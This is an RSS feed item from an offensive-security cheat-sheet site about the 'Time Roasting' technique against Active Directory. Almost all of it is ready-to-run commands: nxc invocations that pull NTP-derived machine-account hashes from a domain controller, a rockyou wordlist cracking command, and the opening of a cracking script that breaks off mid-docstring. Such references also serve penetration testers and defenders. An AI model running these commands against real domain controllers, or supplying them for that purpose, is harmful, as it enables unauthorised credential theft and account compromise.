channel.title: Time Roasting on TLDRBins
channel.description: Recent content in Time Roasting on TLDRBins

item.title: Time Roasting
item.description: Time Roasting nxc # Anonymous nxc smb <DC> -M timeroast # Password nxc smb <DC> -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -M timeroast # Kerberos sudo ntpdate -s <DC_IP> && nxc smb <DC> -u '<USER>' -p '<PASSWORD>' -k -d <DOMAIN> -M timeroast Hash Crack # Modified to Use rockyou.txt python3 timecrack.py <HASH_FILE> /usr/share/wordlists/rockyou.txt #!/usr/bin/env python3 """Perform a simple dictionary attack against the output of timeroast.py. Neccessary because the NTP 'hash' format unfortunately does not fit into Hashcat or John right now.
